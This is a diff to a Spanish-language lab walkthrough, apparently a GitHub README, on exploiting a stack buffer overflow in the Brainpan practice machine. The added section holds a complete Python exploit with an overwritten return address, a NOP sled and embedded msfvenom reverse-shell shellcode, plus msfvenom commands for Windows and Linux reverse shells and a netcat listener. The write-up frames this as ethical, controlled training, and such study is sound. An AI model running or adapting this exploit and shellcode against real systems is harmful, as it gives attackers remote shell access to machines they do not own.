@@ -343,7 +343,7 @@ payload = before_eip + eip + badchars
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.connect(("10.40.2.11",9999))
+s.connect(("IP_Windows",9999))
 s.send(payload)
 s.close()
 ```
@@ -371,7 +371,7 @@ Esto comparará los bytes almacenados en memoria a partir de la dirección del E
 Ya sabiendo que podemos usar todos los bytes para generar un shellcode, debido a que hemos comprobado que todos son representables por el binario de la máquina víctima, usaremos el siguiente comando de la herramienta "msfvenom" para generar un shellcode. En este caso, excluiremos solo el byte "\x00". (En caso de haber encontrado otro byte en el paso anterior que no pudiera ser representado, deberíamos excluirlo junto con el "\x00" para asegurar el funcionamiento correcto del shellcode):
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=10.40.2.4 LPORT=443 --platform windows -a x86 -f c -b '\x00' EXITFUNC=thread
+msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=443 --platform windows -a x86 -f c -b '\x00' EXITFUNC=thread
 ```
 ![Captura30](https://github.com/CBonastre/0-click/assets/151465796/eaae1696-b52b-4b5a-aa83-2ed14c5e69ab)
 
@@ -405,11 +405,93 @@ Este comando buscará si encuentra algún punto de la memoria usado por el ejecu
 
 ![Captura33](https://github.com/CBonastre/0-click/assets/151465796/003a9642-f5b2-4491-a95e-dd2984990fe4)
 
+## Modificar Script
 
-## coming soon...
+Ya sabemos en qué dirección de memoria se realiza la acción "jmp ESP". Por lo tanto, podemos asignar esta dirección al registro "EIP" de nuestro script. Además, añadiremos 16 `"\x90"` antes de nuestro Shell code, que son instrucciones `NOP` (no operation), estas no realizan ninguna acción y sirven para dar tiempo a que nuestro Shell code se descifre y se ejecute de manera correcta.
+
+El script nos quedará así:
+```bash
+#!/usr/bin/python3
+
+import socket
+from struct import pack
+
+
+offset = 524
+
+before_eip =b"A"*offset
+eip = pack("<I", 0x311712F3)
+
+shellcode = (b"\xd9\xd0\xbb\xe1\xac\x65\x13\xd9\x74\x24\xf4\x5a\x29\xc9"
+b"\xb1\x52\x31\x5a\x17\x03\x5a\x17\x83\x0b\x50\x87\xe6\x37"
+b"\x41\xca\x09\xc7\x92\xab\x80\x22\xa3\xeb\xf7\x27\x94\xdb"
+b"\x7c\x65\x19\x97\xd1\x9d\xaa\xd5\xfd\x92\x1b\x53\xd8\x9d"
+b"\x9c\xc8\x18\xbc\x1e\x13\x4d\x1e\x1e\xdc\x80\x5f\x67\x01"
+b"\x68\x0d\x30\x4d\xdf\xa1\x35\x1b\xdc\x4a\x05\x8d\x64\xaf"
+b"\xde\xac\x45\x7e\x54\xf7\x45\x81\xb9\x83\xcf\x99\xde\xae"
+b"\x86\x12\x14\x44\x19\xf2\x64\xa5\xb6\x3b\x49\x54\xc6\x7c"
+b"\x6e\x87\xbd\x74\x8c\x3a\xc6\x43\xee\xe0\x43\x57\x48\x62"
+b"\xf3\xb3\x68\xa7\x62\x30\x66\x0c\xe0\x1e\x6b\x93\x25\x15"
+b"\x97\x18\xc8\xf9\x11\x5a\xef\xdd\x7a\x38\x8e\x44\x27\xef"
+b"\xaf\x96\x88\x50\x0a\xdd\x25\x84\x27\xbc\x21\x69\x0a\x3e"
+b"\xb2\xe5\x1d\x4d\x80\xaa\xb5\xd9\xa8\x23\x10\x1e\xce\x19"
+b"\xe4\xb0\x31\xa2\x15\x99\xf5\xf6\x45\xb1\xdc\x76\x0e\x41"
+b"\xe0\xa2\x81\x11\x4e\x1d\x62\xc1\x2e\xcd\x0a\x0b\xa1\x32"
+b"\x2a\x34\x6b\x5b\xc1\xcf\xfc\x6e\x3e\xcd\xf8\x06\x3c\xd1"
+b"\x01\x6c\xc9\x37\x6b\x82\x9c\xe0\x04\x3b\x85\x7a\xb4\xc4"
+b"\x13\x07\xf6\x4f\x90\xf8\xb9\xa7\xdd\xea\x2e\x48\xa8\x50"
+b"\xf8\x57\x06\xfc\x66\xc5\xcd\xfc\xe1\xf6\x59\xab\xa6\xc9"
+b"\x93\x39\x5b\x73\x0a\x5f\xa6\xe5\x75\xdb\x7d\xd6\x78\xe2"
+b"\xf0\x62\x5f\xf4\xcc\x6b\xdb\xa0\x80\x3d\xb5\x1e\x67\x94"
+b"\x77\xc8\x31\x4b\xde\x9c\xc4\xa7\xe1\xda\xc8\xed\x97\x02"
+b"\x78\x58\xee\x3d\xb5\x0c\xe6\x46\xab\xac\x09\x9d\x6f\xcc"
+b"\xeb\x37\x9a\x65\xb2\xd2\x27\xe8\x45\x09\x6b\x15\xc6\xbb"
+b"\x14\xe2\xd6\xce\x11\xae\x50\x23\x68\xbf\x34\x43\xdf\xc0"
+b"\x1c")
+
+payload = before_eip + eip + b"\x90"*16 + shellcode 
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect(("IP_Windows",9999))
+s.send(payload)
+s.close()
+```
+
+**Reverse Shell**
+
+Ahora podemos ejecutar el script. Esto nos permitirá colocarnos en escucha en el puerto que hemos determinado. En este puerto, recibiremos una reverse shell desde la máquina víctima, es decir, nuestra máquina Windows.
+
+Para hacerlo, puedes utilizar herramientas como `netcat` (nc) u otras que admitan la escucha en un puerto específico. Por ejemplo, si estás utilizando el puerto 443:
+
+```bash
+nc -lvp 443
+```
+
+![Captura34](https://github.com/CBonastre/0-click/assets/151465796/f5a2979b-05b9-4ed5-bf02-b3a438178b76)
 
 
 
+## Ataque a la máquina Brainpan
+
+Hasta este punto, hemos estado trabajando en nuestra máquina Windows. Sin embargo, para completar el ataque, necesitaremos modificar el shell code para crear uno compatible con el sistema operativo Linux, ya que, como verificamos al inicio de esta demostración, la máquina víctima es un sistema Linux. Deberemos generar un nuevo shell code utilizando la herramienta "msfvenom" y reemplazarlo en nuestro script. Además, será necesario cambiar la dirección IP para establecer la conexión con la máquina Brainpan en lugar de la Windows. Con estos cambios, al ejecutar el script, obtendremos acceso a la máquina objetivo.
+
+Aquí te muestro un ejemplo de cómo podrías generar un nuevo shell code utilizando "msfvenom" para un sistema Linux y reemplazarlo en tu script:
+
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=Tu_IP LPORT=443 --platform linux -a x86 -f c -b '\x00' EXITFUNC=thread
+```
+
+![Captura36](https://github.com/CBonastre/0-click/assets/151465796/184de4e5-4fcc-48a3-9021-8ba0b9b1ee89)
+
+![Captura37](https://github.com/CBonastre/0-click/assets/151465796/14cfcb31-bd9e-4a4c-8bd8-bf20d7d49377)
 
 
+## Conclusión
 
+En esta demostración, hemos explorado los fundamentos del desbordamiento de búfer, una vulnerabilidad común en sistemas informáticos. Desde entender cómo se produce el desbordamiento de búfer hasta la explotación de esta vulnerabilidad, hemos recorrido un camino crucial para comprender cómo los atacantes pueden comprometer sistemas.
+
+Es fundamental recordar que estas técnicas deben emplearse de manera ética y bajo entornos controlados, como pruebas de penetración autorizadas o con fines educativos. La seguridad informática es un campo en constante evolución, y comprender las vulnerabilidades como el desbordamiento de búfer es crucial tanto para proteger sistemas como para comprender cómo los atacantes pueden comprometerlos.
+
+¡Espero que esta demostración te haya resultado informativa y útil en tu comprensión de los desbordamientos de búfer y la seguridad informática en general!
